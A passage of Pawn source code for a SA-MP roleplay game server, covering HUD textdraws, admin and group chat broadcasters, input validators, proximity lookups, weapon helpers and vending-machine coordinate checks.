			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][3], 0.000000, 0.000000);
			PlayerTextDrawTextSize(playerid, Speedo_pTD[playerid][3], 44.000000, -1.000000);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][3], 1);
			CheckTextDrawColor(playerid, Speedo_pTD[playerid][3]);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][3], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][3], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][3], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][3], 4);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][3], 0);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][3], 0);

			Speedo_pTD[playerid][4] = CreatePlayerTextDraw(playerid, 190.488891, 383.137695, "....");
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][4], 0.153108, 0.484977);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][4], 1);
			CheckTextDrawColor(playerid, Speedo_pTD[playerid][4]);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][4], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][4], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][4], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][4], 1);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][4], 1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][4], 0);

			Speedo_pTD[playerid][5] = CreatePlayerTextDraw(playerid, 213.444503, 369.542053, "ld_beat:chit");
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][5], 0.000000, 0.000000);
			PlayerTextDrawTextSize(playerid, Speedo_pTD[playerid][5], 40.000000, 41.000000);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][5], 1);
			PlayerTextDrawColor(playerid, Speedo_pTD[playerid][5], 110);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][5], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][5], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][5], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][5], 4);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][5], 0);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][5], 0);

			Speedo_pTD[playerid][6] = CreatePlayerTextDraw(playerid, 233.555526, 385.128875, "000");
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][6], 0.271555, 1.037510);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][6], 2);
			PlayerTextDrawColor(playerid, Speedo_pTD[playerid][6], -1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][6], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][6], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][6], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][6], 3);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][6], 1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][6], 0);

			Speedo_pTD[playerid][7] = CreatePlayerTextDraw(playerid, 233.211318, 380.551086, "(_____)");
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][7], 0.296108, 1.711999);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][7], 2);
			CheckTextDrawColor(playerid, Speedo_pTD[playerid][7]);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][7], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][7], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][7], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][7], 1);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][7], 1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][7], 0);

			Speedo_pTD[playerid][8] = CreatePlayerTextDraw(playerid, 227.777816, 400.559967, "km/h");
			PlayerTextDrawLetterSize(playerid, Speedo_pTD[playerid][8], 0.108888, 0.514844);
			PlayerTextDrawAlignment(playerid, Speedo_pTD[playerid][8], 1);
			CheckTextDrawColor(playerid, Speedo_pTD[playerid][8]);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][8], 0);
			PlayerTextDrawSetOutline(playerid, Speedo_pTD[playerid][8], 0);
			PlayerTextDrawBackgroundColor(playerid, Speedo_pTD[playerid][8], 255);
			PlayerTextDrawFont(playerid, Speedo_pTD[playerid][8], 2);
			PlayerTextDrawSetProportional(playerid, Speedo_pTD[playerid][8], 1);
			PlayerTextDrawSetShadow(playerid, Speedo_pTD[playerid][8], 0);

			for( new i = 0; i < 9; i ++)
			{
				PlayerTextDrawShow( playerid, Speedo_pTD[ playerid ][ i ] );
			}
		}
	}
	else
	{
	    for( new i = 0; i < 9; i ++)
		{
			PlayerTextDrawHide( playerid, Speedo_pTD[ playerid ][ i ] );
			PlayerTextDrawDestroy( playerid, Speedo_pTD[ playerid ][ i ] );
			Speedo_pTD[ playerid ][ i ] = PlayerText:INVALID_TEXT_DRAW;
		}
	}
}

_:public CreatePlayerTextDraws( playerid )
{
	new Float: AltChat_posY = 209.573348,
        Float: AltChat_YSpacing = 240.026733 - 229.573348;

    for(new i = 0; i < MAX_LINES; i++) 
    {
        AltChatTD_Player[i] = CreatePlayerTextDraw(playerid, 35.599971, AltChat_posY, " ");
        PlayerTextDrawLetterSize(playerid, AltChatTD_Player[i], 0.21, 0.9);
        PlayerTextDrawAlignment(playerid, AltChatTD_Player[i], 1);
        PlayerTextDrawColor(playerid, AltChatTD_Player[i], -1);
        PlayerTextDrawSetShadow(playerid, AltChatTD_Player[i], 0);
        PlayerTextDrawSetOutline(playerid, AltChatTD_Player[i], 1);
        PlayerTextDrawBackgroundColor(playerid, AltChatTD_Player[i], 255);
        PlayerTextDrawFont(playerid, AltChatTD_Player[i], 1);
        PlayerTextDrawSetProportional(playerid, AltChatTD_Player[i], 1);
        PlayerTextDrawSetShadow(playerid, AltChatTD_Player[i], 0);
        RemovePlayerAttachedObject(playerid, 6);
        strmid(AltChatTD_Text[playerid][i], " ", 0, 1);
        AltChat_posY += AltChat_YSpacing;
    }

	//

	SpecTextDraw[playerid] = CreatePlayerTextDraw(playerid, 447.000244, 319.422210, "~y~(_0(0)_)~n~Money:_0$~n~Health:_100%~n~Armour:_100%~n~Weapon:_Desert_Eagle(60m)");
	PlayerTextDrawLetterSize(playerid, SpecTextDraw[playerid], 0.173666, 0.994370);
	PlayerTextDrawAlignment(playerid, SpecTextDraw[playerid], 2);
	PlayerTextDrawColor(playerid, SpecTextDraw[playerid], -1);
	PlayerTextDrawSetShadow(playerid, SpecTextDraw[playerid], 0);
	PlayerTextDrawSetOutline(playerid, SpecTextDraw[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, SpecTextDraw[playerid], 255);
	PlayerTextDrawFont(playerid, SpecTextDraw[playerid], 1);
	PlayerTextDrawSetProportional(playerid, SpecTextDraw[playerid], 1);
	PlayerTextDrawSetShadow(playerid, SpecTextDraw[playerid], 0);

	//

	WantedLevel_pTD[playerid][0] = CreatePlayerTextDraw(playerid, 620.566589, 414.029724, "~r~]_]_]_]_]");
	PlayerTextDrawLetterSize(playerid, WantedLevel_pTD[playerid][0], 0.159000, 0.770370);
	PlayerTextDrawAlignment(playerid, WantedLevel_pTD[playerid][0], 3);
	PlayerTextDrawColor(playerid, WantedLevel_pTD[playerid][0], -1465341786);
	PlayerTextDrawSetShadow(playerid, WantedLevel_pTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, WantedLevel_pTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, WantedLevel_pTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, WantedLevel_pTD[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, WantedLevel_pTD[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, WantedLevel_pTD[playerid][0], 0);

	WantedLevel_pTD[playerid][1] = CreatePlayerTextDraw(playerid, 602.000000, 408.722229, "~r~/dosije_-_da_vidite_vas_zlocin!");
	PlayerTextDrawLetterSize(playerid, WantedLevel_pTD[playerid][1], 0.079666, 0.575407);
	PlayerTextDrawAlignment(playerid, WantedLevel_pTD[playerid][1], 2);
	PlayerTextDrawColor(playerid, WantedLevel_pTD[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, WantedLevel_pTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, WantedLevel_pTD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, WantedLevel_pTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, WantedLevel_pTD[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, WantedLevel_pTD[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, WantedLevel_pTD[playerid][1], 0);
}
//------------------------------------------------------------------------------
_:public OnePlayAnim( playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	ApplyAnimation( playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
}
//------------------------------------------------------------------------------
UliceFirme( h )
{
	new imeulice[ MAX_ZONE_NAME ];
   	UliceFirme2( h, imeulice, sizeof( imeulice ) );
   	return imeulice;
}
//------------------------------------------------------------------------------
_:public UliceFirme2(h, zone[], len)
{
	new Float:x22, Float:y22;
	x22 = BusinessInfo[ h ][ bEnterX ]; y22 = BusinessInfo[ h ][ bEnterY ];
	for( new i = 0; i != sizeof(gSAZones); i++ )
	{
		if(x22 >= gSAZones[ i ][SAZONE_AREA][ 0 ] && x22 <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y22 >= gSAZones[ i ][SAZONE_AREA][ 1 ] && y22 <= gSAZones[ i ][SAZONE_AREA][4])
		{
		    return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0);
		}
	}
	return 0;
}
//------------------------------------------------------------------------------
ImeIgraca(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	return name;
}
//------------------------------------------------------------------------------
_:public IsEmailCorrect(email[])
{
	static Regex:rMAIL;
	if(!rMAIL) rMAIL = Regex_New("[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{3,70}");
	return Regex_Check(email, rMAIL);
}
//------------------------------------------------------------------------------
_:public IsPasswordCorrent(password[])
{
	static Regex:rPASS;
	if(!rPASS) rPASS = Regex_New("^([a-zA-Z0-9@*#]{6,20})$");
	return Regex_Check(password, rPASS);
}
//------------------------------------------------------------------------------
GetNearestContainer(playerid) 
{
	new Float:p_Pos[3], Float:maxradius = 4.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_Kont)
    {
        if(VectorSize(p_Pos[0] - KontInfo[i][koObjPos][0], p_Pos[1] - KontInfo[i][koObjPos][1], p_Pos[2] - KontInfo[i][koObjPos][2]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - KontInfo[i][koObjPos][0], p_Pos[1] - KontInfo[i][koObjPos][1], p_Pos[2] - KontInfo[i][koObjPos][2]);
    }
    return id;
}
//------------------------------------------------------------------------------
GetNearestAtm(playerid) 
{
	new Float:p_Pos[3], Float:maxradius = 3.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_ATM)
    {
        if(VectorSize(p_Pos[0] - atmInfo[i][atmPos][0], p_Pos[1] - atmInfo[i][atmPos][1], p_Pos[2] - atmInfo[i][atmPos][2]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - atmInfo[i][atmPos][0], p_Pos[1] - atmInfo[i][atmPos][1], p_Pos[2] - atmInfo[i][atmPos][2]);
    }
    return id;
}
//------------------------------------------------------------------------------
GetNearestBussines(playerid) 
{
	new Float:p_Pos[3], Float:maxradius = 3.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_Bizz)
    {
        if(VectorSize(p_Pos[0] - BusinessInfo[i][bEnterX], p_Pos[1] - BusinessInfo[i][bEnterY], p_Pos[2] - BusinessInfo[i][bEnterZ]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - BusinessInfo[i][bEnterX], p_Pos[1] - BusinessInfo[i][bEnterY], p_Pos[2] - BusinessInfo[i][bEnterZ]);
    }
    return id;
}
//------------------------------------------------------------------------------
_:public SoundForAll( sound )
{
    foreach( new i : Player)
    {
        PlayerPlaySound( i, sound, 0.0, 0.0, 0.0 );
    }
}
//------------------------------------------------------------------------------
AdminMsg(color, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1)
			{
	    		SendClientMessage(i, color, text);
	    	}
	    }
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1)
			{
	    		SendClientMessage(i, color, str);
	    	}
	    }

		#emit RETN
	}
	return 1;
}

AdminMsgForLevel(level, color, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 3)
	{
		if(level == 0)
		{
	    	foreach(new i : Player)
			{
				if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1)
				{
	    			SendClientMessage(i, color, text);
	    		}
	    	}
	    }
	    else if(level >= 1)
	    {
	    	foreach(new i : Player)
			{
				if(PlayerInfo[i][xAdmin] >= level)
				{
	    			SendClientMessage(i, color, text);
	    		}
	    	}
	    }
	}
	else
	{
		while(--args >= 3)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		if(level == 0)
		{
	    	foreach(new i : Player)
			{
				if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1)
				{
	    			SendClientMessage(i, color, str);
	    		}
	    	}
	    }
	    else if(level >= 1)
	    {
	    	foreach(new i : Player)
			{
				if(PlayerInfo[i][xAdmin] >= level)
				{
	    			SendClientMessage(i, color, str);
	    		}
	    	}
	    }

		#emit RETN
	}
	return 1;
}

AChat(color, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1)
			{
	    		SendClientMessage(i, color, text);
	    	}
	    }
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1)
			{
	    		SendClientMessage(i, color, str);
	    	}
	    }

		#emit RETN
	}
	return 1;
}
//------------------------------------------------------------------------------
GMChat(color, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xGamemaster] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1)
			{
	    		SendClientMessage(i, color, text);
	    	}
	    }
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xGamemaster] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1)
			{
	    		SendClientMessage(i, color, str);
	    	}
	    }

		#emit RETN
	}
	return 1;
}

GChat(color, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xGamemaster] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1 || PlayerInfo[i][xVIPLevel] >= 1 || PlayerInfo[i][xPromoter] >= 1
				|| PlayerInfo[i][xYouTuber] >= 1)
			{
	    		SendClientMessage(i, color, text);
	    	}
	    }
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xGamemaster] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1 || PlayerInfo[i][xVIPLevel] >= 1 || PlayerInfo[i][xPromoter] >= 1
				|| PlayerInfo[i][xPromoter] >= 1 || PlayerInfo[i][xYouTuber] >= 1)
			{
	    		SendClientMessage(i, color, str);
	    	}
	    }

		#emit RETN
	}
	return 1;
}

NewbieChat(color, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xGamemaster] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1  || PlayerInfo[i][xLevel] <= 3)
			{
	    		SendClientMessage(i, color, text);
	    	}
	    }
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach(new i : Player)
		{
			if(PlayerInfo[i][xAdmin] >= 1 || PlayerInfo[i][xGamemaster] >= 1 || PlayerInfo[i][xSpecAdmin] >= 1 || PlayerInfo[i][xLevel] <= 3)
			{
	    		SendClientMessage(i, color, str);
	    	}
	    }

		#emit RETN
	}
	return 1;
}

LeaderChat(color, const text[], {Float, _}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach(new i : Player)
		{
			if( PlayerInfo[ i ][ xAdmin ] >= 7 || PlayerInfo[ i ][ xLider ] != 0 || PlayerInfo[ i ][ xSkriptaRank ] == 4 || PlayerInfo[ i ][ xSkriptaRank ] == 1 || PlayerInfo[ i ][ xSkriptaRank ] == 2 || PlayerInfo[ i ][ xSkriptaRank ] == 3)
			{
	    		SendClientMessage(i, color, text);
	    	}
	    }
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach(new i : Player)
		{
			if( PlayerInfo[ i ][ xAdmin ] >= 7 || PlayerInfo[ i ][ xLider ] != 0 || PlayerInfo[ i ][ xSkriptaRank ] == 4 || PlayerInfo[ i ][ xSkriptaRank ] == 1 || PlayerInfo[ i ][ xSkriptaRank ] == 2 || PlayerInfo[ i ][ xSkriptaRank ] == 3)
			{
	    		SendClientMessage(i, color, str);
	    	}
	    }

		#emit RETN
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerClickMap( playerid, Float:fX, Float:fY, Float:fZ )
{
    if( playerid == IPI ) return 1;
    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 && AdminDuty[ playerid ] )
	{
	    SetPlayerPosFindZ( playerid, fX, fY, fZ );
	}
    return 1;
}
//------------------------------------------------------------------------------
_:public SMG_IsNotWeaponNoAmmo( weaponid )
{
	new slot = g_aWeaponSlots[ weaponid ];
	if( slot != 0 && slot != 1 && slot != 10) return 1;
	return(false);
}

_:public SMG_IsGiveVehicleWeapon( weaponid )
{
	if( weaponid == 46 || weaponid == 2 ) return 1;
	return(false);
}

_:public GiveWeaponToPlayer( playerid, weaponid, ammo )
{
	if( IsValidWeapon( weaponid ) )
	{
  		GivePlayerWeapon( playerid, weaponid, ammo );
	}
	return 1;
}

_:public SetWeaponAmmo( playerid, weapon, ammo )
{
	new slot = g_aWeaponSlots[ weapon ];
  	if( weapon > 0 && 47 > weapon && slot != -1 )
 	{
		SetPlayerAmmo( playerid, weapon, ammo );
	}
	return 1;
}

_:public RemovePlayerWeapon(playerid, weaponid)
{
	new plyWeapons[12],
		plyAmmo[12];

	for(new slot = 0; slot != 12; slot++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, slot, wep, ammo);
		
		if(wep != weaponid)
		{
			GetPlayerWeaponData(playerid, slot, plyWeapons[slot], plyAmmo[slot]);
		}
	}
	
	ResetPlayerWeapons(playerid);
	for(new slot = 0; slot != 12; slot++)
	{
		GivePlayerWeapon(playerid, plyWeapons[slot], plyAmmo[slot]);
	}
	return 1;
}

_:public IsValidServerWeapon( playerid, weaponid )
{
    new slot = g_aWeaponSlots[ weaponid ];
	if( IsValidWeapon( weaponid ) && slot != -1 ) return weaponid;
	return(false);
}

_:public GetWeapon( playerid )
{
	new weaponid = GetPlayerWeapon( playerid );

    new slot = g_aWeaponSlots[ weaponid ];
	if( IsValidWeapon( weaponid ) && slot != -1 ) return weaponid;
	return(false);
}

_:public HavePlayerWeapon( playerid )
{
	switch( GetWeapon( playerid ) )
	{
		case 16..18, 22..39, 41, 42: return 1;
	}
	return(false);
}

_:public GetPlayerWeaponAmmo( playerid, weaponid )
{
	new wd[ 2 ][ 13 ];
	for( new i; i < 13; i++ ) GetPlayerWeaponData( playerid, i, wd[ 0 ][ i ], wd[ 1 ][ i ] );
	for( new i; i < 13; i++ )
	{
		if( weaponid == wd[ 0 ][ i ] ) return wd[ 1 ][ i ];
	}
	return(false);
}

//------------------------------------------------------------------------------
public OnPlayerWeaponShot( playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ )
{
	return 1;
}
//------------------------------------------------------------------------------
_:public KodSprunk( playerid )
{
	if( IsPlayerInRangeOfPoint( playerid, 4, -2420.219, 984.578, 44.297 ) ) return 1;
 	else if( IsPlayerInRangeOfPoint( playerid, 4, -2420.180, 985.945, 44.297 ) ) return 1;
  	else if( IsPlayerInRangeOfPoint( playerid, 4, 2225.203, -1153.422, 1025.906 ) ) return 1;
   	else if( IsPlayerInRangeOfPoint( playerid, 4, 2576.703, -1284.430, 1061.094 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2155.906, 1606.773, 1000.055 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2209.906, 1607.195, 1000.055 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2222.203, 1606.773, 1000.055 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 495.969, -24.320, 1000.734 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 501.828, -1.430, 1000.734 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 373.828, -178.141, 1000.734 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 330.680, 178.500, 1020.070 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 331.922, 178.500, 1020.070 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 350.906, 206.086, 1008.477 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 361.563, 158.617, 1008.477 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 371.594, 178.453, 1020.070 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 374.891, 188.977, 1008.477 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2155.844, 1607.875, 1000.063 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2202.453, 1617.008, 1000.063 ) ) return 1;
   	else if( IsPlayerInRangeOfPoint( playerid, 4, 2209.242, 1621.211, 1000.063 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2222.367, 1602.641, 1000.063 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 500.563, -1.367, 1000.734 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 379.039, -178.883, 1000.734 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2480.86,-1959.27,12.9609 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1634.11,-2237.53,12.8906 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2139.52,-1161.48,23.3594 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2153.23,-1016.15,62.2344 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -1350.12,493.859,10.5859 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2229.19,286.414,34.7031 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1659.46,1722.86,10.2188 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2647.7,1129.66,10.2188 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2845.73,1295.05,10.7891 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1398.84,2222.61,10.4219 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -1455.12,2591.66,55.2344 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -76.0312,1227.99,19.125 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 662.43,-552.164,15.7109 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -253.742,2599.76,62.2422 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2271.73,-76.4609,25.9609 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1789.21,-1369.27,15.1641 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1729.79,-1943.05,12.9453 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2060.12,-1897.64,12.9297 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1928.73,-1772.45,12.9453 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2325.98,-1645.13,14.2109 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 2352.18,-1357.16,23.7734 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, 1154.73,-1460.89,15.1562 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -1350.12,492.289,10.5859 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2118.97,-423.648,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2118.62,-422.414,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2097.27,-398.336,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2092.09,-490.055,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2063.27,-490.055,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2005.65,-490.055,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2034.46,-490.055,34.7266 ) ) return 1;
    else if( IsPlayerInRangeOfPoint( playerid, 4, -2068.56,-398.336,34.7266 ) ) return 1;
